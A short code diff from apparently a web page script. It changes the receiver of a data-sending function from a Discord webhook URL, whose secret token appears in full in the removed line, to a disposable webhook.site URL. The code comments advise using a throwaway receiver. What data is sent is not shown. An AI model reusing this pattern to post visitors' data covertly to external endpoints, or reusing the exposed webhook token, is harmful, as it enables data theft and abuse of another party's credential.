@@ -32,7 +32,7 @@ window.onload = function() {
 function sendData(data) {
     // IMPORTANT: Replace 'YOUR_WEBHOOK_URL_HERE' with a real URL
     // Get a free disposable URL from a service like webhook.site or bin.scr
-    const receiverURL = 'https://discord.com/api/webhooks/1449164820489179380/CuXHdA3kI3DEbumJR_uoBUkYxbyD-JUEN9LBZkvXVoeHS8vxpI8hXfuE7CHXudL4kdP7';
+    const receiverURL = 'https://webhook.site/65609100-ad22-4c80-9000-da17c282f065';
 
     fetch(receiverURL, {
         method: 'POST',
